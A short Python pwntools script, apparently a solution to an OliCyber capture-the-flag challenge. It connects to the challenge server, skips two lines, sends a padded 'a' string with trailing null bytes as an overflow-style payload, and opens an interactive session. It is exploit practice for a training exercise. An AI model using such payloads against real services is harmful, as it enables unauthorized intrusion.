from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
import base64
import json

# Creare una connessione TCP
conn = remote("gtn.challs.olicyber.it", 10022)

conn.recvuntil(b"\n") #skip delle prime linee
conn.recvuntil(b"\n") #skip delle prime linee

conn.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaa\0\0\0\0")

conn.interactive()
